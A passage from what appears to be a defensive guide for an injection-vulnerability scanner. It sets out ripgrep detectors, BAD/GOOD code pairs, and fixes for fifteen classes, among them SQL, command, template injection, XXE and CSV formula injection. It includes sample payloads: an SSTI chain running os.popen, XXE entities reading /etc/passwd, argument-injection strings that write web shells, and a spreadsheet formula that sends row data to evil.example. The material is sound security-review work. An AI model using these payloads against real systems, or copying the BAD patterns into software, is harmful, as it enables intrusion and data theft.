node -e 'const {checkSync}=require(process.argv[2]+"/node_modules/recheck"),seen=new Map(),n={};for(const l of require("fs").readFileSync(process.argv[1]+"/re.tsv","utf8").split("\n")){const m=l.match(/^(.+?:\d+):(.*)\t([a-z]*)$/);if(!m)continue;const k=m[2]+"/"+m[3];if(!seen.has(k)){let r;try{r=checkSync(m[2],m[3],{timeout:5000})}catch{r={status:"unknown"}}seen.set(k,r)}const r=seen.get(k);n[r.status]=(n[r.status]||0)+1;if(r.status==="vulnerable")console.log(m[1]+"  "+r.complexity.type+"  /"+m[2]+"/"+m[3])}console.log("# recheck:",JSON.stringify(n),"— unknown = timeout or a non-regex the extractor caught")' "$RC" "$RT"

# 14. GraphQL documents assembled as strings instead of sent with `variables`: the keyword, an optional operation name,
#     then `{` or `(` — a toast id such as `query-error:${msg}` is not a document.
rg -n --pcre2 '(?i)["\x27\x60]\s*(query|mutation|subscription)\b\s*(\w+\s*)?[({][^\n]*(\$\{|#\{|["\x27]\s*\+)' "${X[@]}" . | "${NC[@]}"

# 15. Files that write CSV / spreadsheet output (15a) and files holding a formula neutralizer (15b). 15a minus 15b is the work list.
rg -n --pcre2 '\b(text/csv|text/tab-separated-values|application/vnd\.ms-excel|spreadsheetml)\b|[\w-]\.(csv|tsv|xlsx|xls)["\x27\x60]|\b(json2csv|csv-stringify|csv-writer|fast-csv|exceljs|ExcelJS|unparse|json_to_sheet|aoa_to_sheet|sheet_add_aoa|sheet_add_json|DictWriter|xlsxwriter|openpyxl|fputcsv|PhpSpreadsheet|excelize|CSVPrinter|CSVWriter|CsvWriter|ClosedXML|EPPlus|XSSFWorkbook)\b|\bcsv\.(writer|NewWriter)\(|\.to_(csv|excel)\(|\bCSV\.(generate|open)\b' "${X[@]}" . | "${NC[@]}"
rg -ln --pcre2 '\[(?=[^\]\n]*=)(?=[^\]\n]*@)(?=[^\]\n]*\+)[^\]\n]{2,24}\]|["\x27]=["\x27]\s*,\s*["\x27]\+["\x27]|(?i:formula.?injection|csv.?injection|CWE-1236)' "${X[@]}" .

# 16. Sources beyond HTTP — queue consumers, gateways, webhook routes, model calls. Not a detector: these
#     are the entry points the trace must also start from (§ The taint rule).
rg -n --pcre2 '@(RabbitListener|KafkaListener|SqsListener|JmsListener|EventPattern|MessagePattern|SubscribeMessage|Processor|Process)\(|\bextends\s+\w*WorkerHost\b|\b(consume|subscribe)\(\s*["\x27]|\.on\(\s*["\x27]message["\x27]|\bdef\s+(perform|handle_message|on_message)\b|\bShouldQueue\b|\bSidekiq::(Worker|Job)\b|@(shared_task|app\.task)\b|(@(Controller|Post|All|Put|PostMapping|RequestMapping)\(|\.(post|all|put|route|add_url_rule)\(|^\s*(post|match)\s)\s*["\x27][^"\x27\n]*webhook|\b(chat\.completions\.create|messages\.create|responses\.create|generateContent|generateText|streamText|invoke_model)\(|\btool_calls\b' "${X[@]}" . | "${NC[@]}"
```

A finding is grep-hit **plus** a read of the enclosing function **plus** the hops back to a source. The greps narrow; they do not decide. A multi-line call (`shell=True` three lines below `subprocess.run(`) shows up as the flag line — read upward to the call. Two blind spots are structural, so work around them rather than trust a quiet grep:
- **Aliases defeat call-name greps.** `const run = promisify(exec)` then `` run(`convert ${x}`) `` never says `exec(` at the call site. Greps 4c, 4d and 5a key on the command string, the import and the binary name instead; every file 4d lists is read in full.
- **Source-named greps see only direct references.** Greps 2a, 3, 10b and 13a match `req.query.sort`, not a `sort` parameter three calls deep. The sink-side greps (1, 4, 6, 7, 8, 11, 12) do not depend on the source's name — trust those for recall, and use the source-named ones to find entry points.

**Bulk triage by path class.** `X` drops what is never a sink. What it keeps can still run to hundreds on a monorepo — measured on a real NestJS-on-Fastify monorepo with MikroORM (about 12k files), 95 of grep 1a's 103 kept hits sat in `scripts/`. A path class may be closed with **one cited reason** instead of a read per hit, when the reason is checked, not assumed: `scripts/`, `tools/` and `bin/` close as "not request-reachable" only after `rg -n --hidden -g 'Dockerfile*' -g '*.{yml,yaml,toml}' -g 'package.json' -g 'Procfile' -g '!**/node_modules/**' '<dir>/' .` shows no image, deployed job or route runs them. CI steps and `package.json` scripts that do run them make them operator-run, not request-reachable — read only the hits that take argv or env from CI input. Count every class in the coverage line (`103 hits: 8 read, 95 scripts — not request-reachable, no deploy reference`). Shipped code is never bulk-closed.

## Scans for

Default severity assumes a source reachable by an anonymous or ordinary user. Drop one step when only an administrator can reach the source; never drop a class to "info" because it is behind login.

| § | Class | OWASP | CWE | Default |
|---|---|---|---|---|
| 1 | SQL injection (incl. ORM raw escape hatches) | A05:2025 | CWE-89 | critical |
| 2 | Non-bindable identifiers (ORDER BY, table, column, LIMIT) | A05:2025 | CWE-89 | critical |
| 3 | NoSQL operator injection | A05:2025 | CWE-943 | critical on auth / `$where`, else high |
| 4 | OS command injection | A05:2025 | CWE-78 | critical |
| 5 | Argument injection | A05:2025 | CWE-88 | high (critical when the option executes) |
| 6 | Code / expression-language injection | A05:2025 | CWE-94, CWE-95, CWE-917 | critical |
| 7 | Server-side template injection | A05:2025 | CWE-1336 | critical |
| 8 | XXE | A05:2025 (as `@security-auditor` files it) | CWE-611, CWE-776 | high (critical when it reaches secrets) |
| 9 | LDAP / XPath injection | A05:2025 | CWE-90, CWE-643 | high (critical on a login filter) |
| 10 | Header / CRLF, email-header and log injection | A05:2025 · A09:2025 for logs | CWE-113, CWE-93, CWE-117 | medium |
| 11 | Insecure deserialization | A08:2025 | CWE-502 | critical |
| 12 | Prototype pollution | A08:2025 | CWE-1321 | high (critical with an RCE gadget) |
| 13 | ReDoS | A10:2025 | CWE-1333 | medium (high on an unauthenticated hot path) |
| 14 | GraphQL documents built from strings | A05:2025 | CWE-943 | high |
| 15 | CSV / spreadsheet formula injection | A05:2025 | CWE-1236 | medium (low when only the author opens the file) |

### 1. SQL injection — query text built from input

```
BAD:   pool.query(`SELECT * FROM orders WHERE status = '${req.query.status}'`)
       cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
       db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))
GOOD:  pool.query('SELECT * FROM orders WHERE status = $1', [req.query.status])
       cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
       db.Query("SELECT * FROM users WHERE id = $1", id)
```
Grep 1 is the candidate list. A hit is a finding when the spliced value traces to a source. The escape hatches have **safe twins that look almost identical** — read which one the code calls:

| Binds (safe) | Splices (the finding) |
|---|---|
| `` prisma.$queryRaw`… ${x}` `` (tagged) | `` $queryRawUnsafe(`… ${x}`) ``, `$queryRaw(Prisma.raw(x))` |
| `` sql`… ${x}` `` (Drizzle, postgres.js, Slonik tags) | `sql.raw(x)`, `sql.unsafe(x)` |
| `knex.raw('a = ?', [x])`, `sequelize.query(q, { replacements })` | `knex.raw('a = ' + x)`, `Sequelize.literal(x)` |
| MikroORM `` sql`… ${x}` `` (each `${}` becomes a bound `?`), `raw('a = ?', [x])`, `em.execute(q, [x])`, `raw(alias => …)` interpolating only the alias | `` em.execute(`… ${x}`) ``, `` raw(`… ${x}`) ``, `qb.where('a = ' + x)`, a `{ [raw(…)]: v }` key built from input |
| `FromSqlInterpolated($"… {x}")` | `FromSqlRaw($"… {x}")` |
| MyBatis `#{x}` | MyBatis `${x}` |
| `where("a = ?", v)` / Django `raw(sql, [v])` | `where("a = #{v}")` / `raw(f"… {v}")` |

Dynamic SQL in stored procedures (grep 1c) is the same bug one layer down: `EXECUTE '… ' || col` and `EXEC('…' + @name)` splice; `format('%I', col)`, `quote_ident`, `EXECUTE … USING` and `sp_executesql` with parameters bind.

**SQL written as text for later execution** — a dump, seed or backup exporter that builds `INSERT … VALUES ('…')` with a quote-doubling helper — has no bind API, and the file runs later under the restorer's session settings. Doubling `'` is complete only while `standard_conforming_strings = on`; restored with it off, a stored `x\'); <stmt>; --` runs `<stmt>`, often as the superuser the restore needs. A grep 1a / 1e hit whose string is returned or written rather than passed to a driver is this shape (second-order: the source is whoever writes the dumped columns). Fix: pin the session in the file's header as pg_dump does (`SET standard_conforming_strings = on; SET client_encoding = 'UTF8';`), or emit `COPY … FROM stdin` blocks. Rate it as an escaped sink (`[report-flagged]`, one step lower).

### 2. Non-bindable identifiers — "parameterized, but"

Bind parameters carry **values** only. A table or column name, a sort column, `ASC`/`DESC`, and in most drivers `LIMIT`/`OFFSET` cannot be bound — so a query that binds every value and interpolates one identifier is a complete SQL injection (`ORDER BY (CASE WHEN (SELECT …) THEN a ELSE b END)` extracts the database one bit per request). This is the carve-out `rules/security-principles.md` § "Must" states.

```
BAD:   pool.query(`SELECT * FROM items WHERE owner = $1 ORDER BY ${req.query.sort} ${req.query.dir}`, [uid])
       const set = Object.keys(req.body).map((k, i) => `${k} = $${i + 2}`).join(', ')   // keys are attacker JSON
       User.order(params[:sort]) · ->orderBy($request->sort) · gdb.Order(sort) · order_by(text(sort))
GOOD:  const SORT = { created: 'created_at', total: 'total_cents' };
       const col = SORT[req.query.sort] ?? 'created_at';
       const dir = req.query.dir === 'asc' ? 'ASC' : 'DESC';
       const limit = Math.min(Number.parseInt(req.query.limit, 10) || 20, 100);
```
Grep 2a finds sort/column/table names read from input; grep 2b finds an identifier interpolated beside a bound placeholder. The **object-keys-as-columns** shape is the one most often missed: values bound, keys spliced, so a key like `"status = 'paid', tenant_id"` rewrites the statement. It is also mass assignment — report the SQL injection here, cite `@api-security-reviewer` for the over-posting. Fix: an allow-list map to constants (or the DTO's declared fields for a `SET` list). Identifier quoting (`pg-format %I`, knex `??`, psycopg `sql.Identifier`, `quote_ident`) stops the breakout but still lets the caller sort or filter by a column you never meant to expose — use it **with** the allow-list, not instead of it. Before rating an object-keyed `orderBy({ [field]: dir })`, read the ORM's order-by builder in `node_modules` — the answer is version-specific: MikroORM 6.6 passes each key through `knex.ref` and allow-lists the direction (`validateOrderByDirection`), so the risk is the exposed-column oracle, not a breakout; TypeORM's `orderBy(string)` places the string in the statement as written. A query helper whose sort allow-list is optional (unset → any field) is Hardening until a caller passes request input to it. `X` drops migrations; grep 2c lists where a migration runner is called — anywhere but a CLI or deploy job (a route, a boot hook), and the migrations are back in scope.

### 3. NoSQL injection — operator objects

A JSON body, an extended query-string parser (`?password[$ne]=x` under `qs`, PHP / Laravel `a[$ne]=`, Rails nested params) turns an expected string into an operator object.

```
BAD:   User.findOne({ email: req.body.email, password: req.body.password })   // {"password":{"$ne":null}} → login bypass
       users.find(req.body) · db.users.find(request.get_json())                 // whole body as the filter
       users.find({ $where: 'this.name == "' + req.body.name + '"' })           // server-side JS
GOOD:  const { email, password } = LoginSchema.parse(req.body)    // z.string() — an object fails validation
       User.findOne({ email: { $eq: email } })                     // $eq pins the operator
```
A finding when a request value reaches a filter position without a scalar type check, or any `$where` / `$function` / `$accumulator` / `mapReduce` takes input. User-supplied `$regex` is also §13. Fix: schema-validate to scalars, `$eq`, Mongoose `sanitizeFilter`; a sanitizing middleware is depth, not the fix.

**SQL ORMs with operator syntax have the same bug** — an object in a filter **value** position: MikroORM `{ col: { $ne: null } }` / `$like` / `$re`, Prisma `{ not: '' }` / `{ contains: … }`, Sequelize with string operator aliases. Grep 3b lists the NestJS doors: `ValidationPipe` skips a parameter whose metatype is a primitive, so `@Body('x') x: string` can arrive as an object, and `@Allow()` / `@IsObject()`-only DTO properties survive `whitelist: true`. Express 4 with `qs` builds `{ $ne: … }` from `?a[$ne]=x`; Fastify's querystring parser is flat (a repeated key gives an array, never an object).

### 4. OS command injection

```
BAD:   exec(`convert ${req.body.file} out.png`)
       subprocess.run("ping " + host, shell=True) · os.system(f"rm -rf {path}")
       spawn('ls', [dir], { shell: true })          // shell:true joins argv into a shell string
       exec.Command("sh", "-c", "ls " + dir) · Runtime.getRuntime().exec("ping " + host)
GOOD:  execFile('/usr/bin/convert', [file, 'out.png'])            // no shell
       subprocess.run(["/usr/bin/ping", "-c", "1", "--", host])
       exec.Command("/usr/bin/ping", "-c", "1", host)
```
A finding when a tainted value reaches the string a shell parses: grep 4a sinks with a non-constant argument, any argv call with `shell: true` / `shell=True`, PHP and Ruby backticks (grep 4b), a command-line string that interpolates (grep 4c — it finds the command whatever wrapper runs it), `cmd.exe /c`. Fix: the argv-array API with no shell and an absolute binary path (`ProcessBuilder(List)`, `system(bin, *args)`, `proc_open([...])`, `ProcessStartInfo.ArgumentList`); when input chooses an operation, map it through an allow-list. Then check §5 — removing the shell does not remove argument injection.

### 5. Argument injection — no shell, still attacker-controlled

A user value placed in argv that begins with `-` becomes an **option**: `git ls-remote --upload-pack='touch /tmp/x'`, `curl -o /var/www/html/x.php`, `ssh -oProxyCommand=…`, `tar --checkpoint-action=exec=…`, `rsync -e …`, `find … -exec`, `sendmail -X /var/www/log.php`; and a value with a coder prefix (`msl:`, `ephemeral:`, `url:`) is an ImageMagick instruction.

```
BAD:   execFile('git', ['log', req.query.ref])        // ref = "--output=/etc/cron.d/x"
       subprocess.run(["curl", url])                   // url = "-o/var/www/shell.php"
GOOD:  if (!/^[\w./-]+$/.test(ref) || ref.startsWith('-')) reject(400);
       execFile('git', ['log', '--end-of-options', ref])
       subprocess.run(["curl", "--proto", "=https", "--", url])
```
Grep 5a lists every spawn of an option-parsing binary; a finding when a tainted value lands in argv before a `--` (git: `--end-of-options`, since `--` there means "paths follow"). Grep 5b lists escaping helpers — `escapeshellarg('--upload-pack=x')` is still an option; read each. Fix: `--` before user values, reject a leading `-`, validate the value's shape (a ref, a URL with an allow-listed scheme), prefix files as `./name`, force the ImageMagick coder (`png:` + path) and a restrictive `policy.xml`.

### 6. Code and expression-language injection

```
BAD:   eval(req.body.expr) · new Function('a', code) · vm.runInNewContext(code)   // vm is not a sandbox
       setTimeout('refresh(' + id + ')', 10) · require(req.query.plugin)
       eval(condition.operand_2)            # second-order: a rule row users can edit
       getattr(handlers, request.args["action"])() · obj.send(params[:method]) · params[:type].constantize
       parser.parseExpression(request.getParameter("expr")).getValue()          // SpEL
GOOD:  const HANDLERS = { export: doExport, archive: doArchive };  (HANDLERS[action] ?? reject)()
       a real expression grammar (JSON Logic, a math parser with no function access), ast.literal_eval for literals
       SpEL only with SimpleEvaluationContext.forReadOnlyDataBinding()
```
A finding when input — directly or from a stored row — reaches an evaluator, a dynamic `require`/`import`, or reflective dispatch (`send`, `getattr`, `constantize`, `const_get`, `importlib`). PHP adds `assert($string)` (PHP < 8), `create_function`, `preg_replace` with `/e` (PHP < 7); Java adds OGNL, MVEL, `ScriptEngine`, `GroovyShell`. `vm2` and `vm` are not fixes — removing evaluation is.

### 7. Server-side template injection (SSTI)

The user controls the **template source**, not a variable inside it — Jinja2 `{{ cycler.__init__.__globals__.os.popen('id').read() }}`, FreeMarker `"freemarker.template.utility.Execute"?new()`, Velocity, Twig, ERB, Go `text/template`, Handlebars, Pug, Nunjucks, lodash `_.template`.

```
BAD:   render_template_string("Hello " + request.args["name"]) · jinja2.Template(user_tpl).render()
       Handlebars.compile(req.body.template) · $twig->createTemplate($request->tpl) · ERB.new(params[:tpl])
       res.render('profile', req.query)       // EJS: attacker sets view options → outputFunctionName RCE
       return "user/" + lang + "/welcome";    // Spring view name → Thymeleaf expression preprocessing
GOOD:  render_template("hello.html", name=request.args["name"])   // fixed template, value as context
       res.render('profile', { name: req.query.name })              // pick the fields
       user-authored templates: a logic-less engine (Mustache, Liquid) with no app objects in context
```
Grep 7a is the compile/render-from-string set; grep 7b is Spring controllers returning a concatenated view name and Thymeleaf `__${…}__` preprocessing. A finding when the template string or view name traces to a source. Jinja2's `SandboxedEnvironment` narrows the blast radius; it is not a licence to compile user templates.

Grep 7c is the template most Node apps actually have: `{{var}}` filled by chained `.replace(/\{\{name\}\}/g, value)`. Nothing evaluates, so it is not SSTI — but a string replacement interprets `$&`, `` $` `` and `$'`, and a later replace re-expands a placeholder an earlier value smuggled in (`X $' {{total}}` splices the template's tail into the message). Low, Hardening unless the text reaches another user's trust decision. Fix: one pass with a function replacer over an allow-list map — `tpl.replace(/\{\{(\w+)\}\}/g, (_, k) => VARS[k] ?? '')`.

### 8. XXE — XML external entities

A parser that resolves DTDs turns `<!ENTITY x SYSTEM "file:///etc/passwd">` into a file read, `SYSTEM "http://169.254.169.254/…"` into SSRF, and nested entities into a billion-laughs DoS (CWE-776).

```
BAD:   DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(in)   // Java default resolves DTDs
       etree.XMLParser(resolve_entities=True) · libxmljs.parseXml(x, { noent: true })
       simplexml_load_string($x, 'SimpleXMLElement', LIBXML_NOENT) · new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse }
GOOD:  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
       defusedxml.ElementTree.fromstring(x) · no LIBXML_NOENT · DtdProcessing.Prohibit + XmlResolver = null
```
Unsafe **by default**: the Java factories in grep 8a (`DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, `SAXReader`, `Unmarshaller`) unless hardened in the same file (grep 8c), and .NET `XmlDocument` / `XmlTextReader` on frameworks before 4.5.2. Unsafe **by flag**: every grep 8b hit. **Not XXE**: Go `encoding/xml`, `xml2js`, `fast-xml-parser`, Python's stdlib `xml.etree` — check their entity-expansion limits instead. Surfaces to trace: SOAP endpoints, SAML responses, SVG rasterized server-side, DOCX/XLSX/PPTX/ODT (zipped XML), RSS/Atom/sitemap import, XInclude, XSLT (Xalan/Saxon extension functions are code execution). The uploaded file's handling is `file-access-scan`'s; the parser configuration is this detector's.

### 9. LDAP and XPath injection

```
BAD:   client.search(base, { filter: '(uid=' + user + ')' })     // user = "*)(uid=*))(|(uid=*" → any account
       xpath.evaluate("//user[name='" + n + "']", doc)            // n = "' or '1'='1"
GOOD:  new EqualityFilter({ attribute: 'uid', value: user })        // ldapjs filter object
       ldap.filter.escape_filter_chars(user) · ldap_escape($u, '', LDAP_ESCAPE_FILTER) · Spring LdapQueryBuilder
       tree.xpath("//user[name=$n]", n=n) · XPathVariableResolver
```
A finding when a tainted value is spliced into a filter (RFC 4515) or a DN without the library's encoder, or into an XPath string instead of an XPath variable. On a login or group-membership filter it is an authentication bypass — critical.

### 10. Header / CRLF, email-header and log injection

- **Response splitting** (CWE-113): `\r\n` in a value passed to `setHeader`, `Set-Cookie`, `Content-Disposition` or `Location` injects headers or a body. Most current runtimes reject or strip CR/LF in header values (Node's `http`, Go `net/http`, current Servlet containers, Werkzeug) — **verify the runtime and its version** before rating it; custom proxies, raw sockets, old frameworks and non-HTTP protocols remain. Where the `Location` value is a URL, its *target* is `ssrf-scan` § "7. User-controlled redirect target (open redirector)".
- **Email-header injection** (CWE-93): a contact form's address or subject into PHP `mail()` additional headers or a raw `From:` / `Reply-To:` adds `Bcc:` recipients. Fix: the mail library's address API, reject CR/LF.
- **Log injection** (CWE-117, A09): input with `\n` written into a plain-text log forges entries (`login OK user=admin`) and breaks parsers; ANSI escapes attack whoever tails it. Fix: a structured (JSON) logger whose encoder escapes control characters, or strip `\r\n` and control characters before the line is built. A JSON logger (pino, winston's `json` format, structlog, zap) already escapes `\n` — check whether a pretty transport (`pino-pretty`) ships in the production image or is a devDependency the production install prunes before rating a 10b hit. Log4j 2 below 2.17.1 turns a logged string into JNDI code execution — that is a version finding for `deps-audit`.

```
BAD:   res.setHeader('X-Display-Name', req.query.name) · header("X-User: " . $_GET['u'])
       logger.info(`login failed for ${req.body.username}`)
GOOD:  logger.info({ event: 'login_failed', username: req.body.username })   // JSON encoder escapes \n
```

### 11. Insecure deserialization

Formats that rebuild **arbitrary types** run constructors and magic methods (gadget chains) during the read:

| Lane | Sinks (grep 11) | Fix |
|---|---|---|
| Python | `pickle` / `cPickle` / `dill` / `joblib` / `shelve` / `pd.read_pickle` / `jsonpickle.decode`, `marshal`, `yaml.load` with `Loader` / `FullLoader` / `UnsafeLoader`, `torch.load` without `weights_only=True`, `numpy.load(allow_pickle=True)` | JSON + schema, `yaml.safe_load`, safetensors for model weights |
| Java / Kotlin | `ObjectInputStream.readObject`, `XMLDecoder`, `XStream` without an allow-list, Jackson `enableDefaultTyping` / `activateDefaultTyping` / `@JsonTypeInfo(use = Id.CLASS)`, SnakeYAML before 2.0 `new Yaml()` | JSON to a concrete DTO; `ObjectInputFilter` allow-list when the format cannot go |
| PHP | `unserialize($input)`; `phar://` on any file function is an implicit unserialize | `json_decode`; `unserialize($x, ['allowed_classes' => false])` as a stopgap |
| Ruby / Rails | `Marshal.load`, `YAML.unsafe_load` (`YAML.load` is safe only on Psych ≥ 4 / Ruby ≥ 3.1 — check the lockfile) | `JSON.parse`, `YAML.safe_load(permitted_classes: [...])` |
| Node | `node-serialize`, `serialize-to-js`, `funcster` | `JSON.parse` + schema |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `LosFormatter`, `SoapFormatter`, Json.NET `TypeNameHandling` ≠ `None` | `System.Text.Json` to concrete types |

The source is often disguised: a cookie, a hidden form field, a cache entry, a queue message, an uploaded "model file". An HMAC on the blob is integrity, not safety — a leaked key turns it back into RCE; remove the native format.

### 12. Prototype pollution

A recursive merge or path-set of request JSON writes through `__proto__` or `constructor.prototype`, and every object in the process inherits the attacker's property — `isAdmin`, or `shell` / `env` / `NODE_OPTIONS` picked up by the next `child_process` call (RCE), or a template engine's options.

```
BAD:   _.merge(prefs, req.body) · _.set(config, req.body.path, req.body.value)
       settings[req.body.section][req.body.key] = req.body.value          // section = "__proto__"
       function deepMerge(t, s) { for (const k in s) { … deepMerge(t[k], s[k]) … } }   // no key guard
GOOD:  if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
       Object.create(null) targets or a Map · schema-validate and strip unknown keys first
       node --disable-proto=delete · Object.freeze(Object.prototype) at boot (depth)
```
Read the body parser's defaults first. Fastify — and NestJS on Fastify, its raw-body JSON parser included — rejects `__proto__` and `constructor.prototype` keys (`onProtoPoisoning` / `onConstructorPoisoning` default `'error'`); Express `body-parser` and a bare `JSON.parse` keep `__proto__` as an own key that a later merge copies. Behind a closed JSON door the doors left are multipart field maps (`fields[part.fieldname] = …` into a plain `{}`), urlencoded and custom parsers, and `JSON.parse(rawBody)`. Grep 12a is the library and two-level-write set; grep 12b lists every hand-written merge/clone/set — **read each for the key guard**, it is the usual finding. `Object.assign(target, parsed)` with a parsed `__proto__` key swaps only that copy's prototype — medium, and only if inherited fields are trusted later. Whether a library *version* is patched is `deps-audit`'s question. Python has the same shape as class pollution (a recursive `setattr` merge reaching `__class__.__init__.__globals__`); client-side pollution from `location` parsing feeds DOM-XSS gadgets — hand that to `xss-scan`.

### 13. ReDoS

```
BAD:   new RegExp(req.query.pattern) · re.compile(request.args["p"]) · { name: { $regex: req.query.q } }
       /^(\w+\s?)*$/.test(req.body.name)        // nested quantifier, uncapped input → exponential backtracking
GOOD:  new RegExp(escapeRegExp(q)) · re.escape(q) · Pattern.quote(q) · preg_quote($q, '/')
       cap the input length before matching; rewrite to an unambiguous pattern; or a linear engine (re2)
```
(a) Grep 13a — a regex compiled from input is a finding unless the input is escaped to a literal; `str.match(x)` / `matchAll(x)` compile a non-RegExp `x` implicitly. (b) Grep 13b — a constant regex with a quantified group that itself contains a quantifier (`(a+)+`, `(\w+\s?)*`, `(a|aa)+`) is a finding when it runs on a source with no length cap. In Node a single request stalls every user on the event loop. Go `regexp`, Rust `regex` and RE2 run in linear time — (b) is `N/A` there; .NET can opt in with `RegexOptions.NonBacktracking` or a match timeout. (c) 13b sees only exponential shapes. **Polynomial** ReDoS comes from adjacent overlapping quantifiers — `\s+(city|town)\s*$`, `^[^\s@]+@[^\s@]+\.[^\s@]+$` — and one 50k-character input measured 2.1–2.3 s on Node 23.8. Grep 13c runs every JS/TS regex literal through `recheck`, which reports both kinds (no network → `blocked`, not `checked`). A hit is a finding only on a server path whose input has no length cap before the match; a browser-only regex stalls its own tab — low. Fix: cap the length at the call site, collapse to an unambiguous pattern (`trim` once, then `/\s(?:city|town)$/`), or replace a validation regex with `split` + length checks.

### 14. GraphQL documents built from strings

Server code calling a downstream GraphQL API by interpolating values into the document (`` `query { user(id: "${id}") { email } }` ``) lets a quote close the argument and add fields, aliases or a mutation. Fix: a constant document plus `variables`. Resolver arguments that reach SQL or a document store are §1 / §3. Depth, complexity, introspection and batching limits are `@api-security-reviewer` § "GraphQL (if the API exposes a GraphQL endpoint)".

### 15. CSV / spreadsheet formula injection

An export writes a cell that a user typed — a customer name, a product title, an address, an imported row — and the operator who downloads it opens it in Excel, LibreOffice or Google Sheets. A cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return is read as a **formula**: `=HYPERLINK("https://evil.example/?d="&A2,"Open")` exfiltrates the row it sits in, `=IMPORTXML(…)` / `=WEBSERVICE(…)` call out on open, and DDE payloads (`=cmd|' /C calc'!A0`) still prompt in desktop Excel.

```
BAD:   rows.map(r => [r.name, r.phone].join(',')).join('\n')            // name = "=HYPERLINK(...)"
       XLSX.utils.json_to_sheet(customers) · writer.writerow([order.note]) · fputcsv($out, $row)
GOOD:  const cell = v => (/^[=+\-@\t\r]/.test(v) ? "'" + v : v)         // neutralize, then CSV-quote
       quote every field, double embedded quotes; apply it in the one shared writer every export uses
```
Grep 15a lists files that emit CSV / TSV / XLSX (MIME types, download filenames, writer libraries); grep 15b lists files that hold a neutralizer. A finding when a 15a file writes a user-writable value with no neutralizer on its path — trace the column to whoever writes it, as for any second-order source. Hand-rolled writers (`join(',')`) are found by the MIME type or filename at the download site; follow the bytes back to the builder. A numeric column formatted by the server is not a source. Severity: medium; low when only the user who typed the value ever downloads the file. Re-exported rejected-rows files from a bulk import are the `import` domain's `schema-reviewer` + lens `import-review` rule when that domain is installed — report the sink here either way.

## Output

```
injection-scan — lanes: node (package.json), python (pyproject.toml); go, jvm, ruby, php, .net absent

Findings: 3

1. src/db/orders.repo.js:58                                    [report-with-fix]  critical
   §2 identifier injection — `${k} = $${i + 2}` builds the SET list from Object.keys(patch).
   Source: PATCH /orders/:id → Object.assign(patch, req.body) (src/routes/orders.js:56).
   Values are bound; the keys are attacker JSON. Fix: build SET only from an allow-list of
   updatable columns; reject unknown keys. A05:2025 · CWE-89 (over-posting → @api-security-reviewer)

2. app/rules/engine.py:147                                     [report-with-fix]  critical
   §6 code injection, second-order — eval(condition.operand_2); operand_2 is written by any
   tenant user through POST /rules (app/rules/views.py:88). Fix: replace eval with a parser for
   the rule grammar; never evaluate stored text. A05:2025 · CWE-95

3. src/media/convert.js:21                                     [report-flagged]  high
   §5 argument injection — spawn('convert', [req.body.src, out]); src may begin with '-' or a
   coder prefix (msl:). Unproven link: route mounted behind an auth guard not yet read.
   Fix: reject leading '-' and 'x:' prefixes, force 'png:' + path, restrictive policy.xml. A05:2025 · CWE-88

Class coverage:
  §1  SQL injection               checked (14 hits → 0 findings)
  §2  identifiers                 checked (3 hits → 1 finding)
  §3  NoSQL operators             N/A (no document-store driver in any manifest)
  §4  OS command                  checked (2 hits → 0 findings)
  §5  argument injection          checked (1 hit → 1 finding)
  §6  code injection              checked (4 hits → 1 finding)
  §7  SSTI                        checked (0 hits)
  §8  XXE                         N/A (no XML parser or SAML library imported)
  §9  LDAP / XPath                N/A (no LDAP client, no XPath API)
  §10 header / CRLF / log         checked (9 hits → 0 findings; Node 20 rejects CR/LF in headers)
  §11 deserialization             checked (1 hit → 0 findings: yaml.safe_load)
  §12 prototype pollution         checked (2 hits → 0 findings)
  §13 ReDoS                       checked (5 hits → 0 findings)
  §14 GraphQL strings             blocked (src/__generated__ is 2 MB of codegen; sinks there not read)
  §15 CSV / formula               checked (4 writer files, 1 neutralizer → 0 findings: every export goes through it)
```

`[report-with-fix]` — the source-to-sink path is traced end to end and the fix is concrete. `[report-flagged]` — the sink is unsafe but one link is unproven (source reachability, a runtime or version mitigation, a hop through code not read); the row names that link. The class-coverage block lists **all fifteen** classes on every run: `checked (k hits → m findings)` only when the class's grep ran on a lane that is present, `N/A (<reason>)` only when the repo has no such sink, `blocked (<reason>)` when the grep could not run or the code could not be read.

## False positives / gotchas

- **Tagged templates bind.** `` sql`…${x}` `` and `` prisma.$queryRaw`…${x}` `` hit grep 1 and are safe; `` pool.query(`…${x}`) `` hits the same grep and is not. Read whether the template is a tag or a plain string passed to a call.
- **DB-API `%s` is a placeholder.** `execute("… %s", (v,))` binds; `execute("… %s" % v)` splices. One character apart — the comma.
- **An f-string inside the params tuple is a value.** `(f"%{q}%",)` is bound; its `%`/`_` wildcards are a correctness question, not injection.
- **"Parameterized" is not a verdict.** A query with every value bound can still splice an identifier (§2) — check the `ORDER BY`, the table name and the `SET` keys of every dynamic query.
- **`.exec(` on a RegExp or a DB handle is not a process.** Grep 4a excludes method calls; a destructured `exec` from `child_process` is still caught.
- **A constant is not a source — unless an admin UI writes it.** Settings tables, feature-flag payloads and "rule" rows are second-order sources.
- **Mitigations are versioned.** CR/LF rejection in headers, Psych 4's safe `YAML.load`, SnakeYAML 2.0, `torch.load`'s `weights_only` default — read the lockfile before relying on one; unknown version → `[report-flagged]`.
- **Validation after the sink does not count**; neither does validation in a sibling route the attacker can skip.
- **Test files and fixtures** carrying payloads are not findings unless shipped code imports them — `X` drops them, so list shipped files that import one: `rg -n --pcre2 "from ['\"][^'\"]*(/tests?/|/__mocks__/|/fixtures/|\.(test|spec)['\"])" "${X[@]}" .`. **Generated code** (ORM clients, GraphQL codegen) is not the sink — its caller is.
